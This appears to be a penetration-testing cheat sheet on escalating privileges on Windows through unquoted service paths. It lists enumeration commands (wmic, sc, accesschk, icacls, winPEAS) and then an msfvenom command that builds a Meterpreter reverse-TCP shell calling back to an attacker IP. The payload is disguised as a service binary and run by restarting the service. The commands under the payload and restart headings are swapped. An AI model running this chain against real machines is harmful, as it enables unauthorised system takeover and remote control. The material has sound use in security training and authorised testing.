# Unquoted Service Paths

{% hint style="info" %}
Summary:

* Service must have unquoted service path
* Service must be running as desired user (i.e. higher privileged user)
* Service must be able to be restart
* Service must be able to be restarted by the current user
* Unquoted path can be written by the current user
{% endhint %}

## Look for unquoted service path vuln

Check for vulnerable services

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Or use Powershell

```
powershell -c "Get-Service"
```

If using winPEAS

```
.\winpeas.exe servicesinfo
```

## Get additional information

Make sure the vulnerable service runs as high privileged user:

```
sc qc <servicename>
```

If using PowerUp.ps1, make sure `CanRestart` field is `True` for the vulnerable service.

```
.\accesschk.exe /accepteula -ucqv <ServiceName>
```

If the service can be restarted, check if we can write to the service path. This can be checked manually with `accesschk.exe`

```
icacls <File Path>
.\accesschk.exe /accepteula -uwdq <File Path>
```

## Running payload

Create a payload and place at the unquoted path

```
net stop/start <ServiceName>
sc stop/start <ServiceName>
```

Restart the service / reboot the host. To restart the service, use either of the following command line tools.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.189 LPORT=80 EXITFUNC=thread -f exe -o Iperius.exe
```

Start multi handler and migrate to new process (meterpreter)

```
run post/windows/manage/migrate
```

Here's a good example to follow: [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)
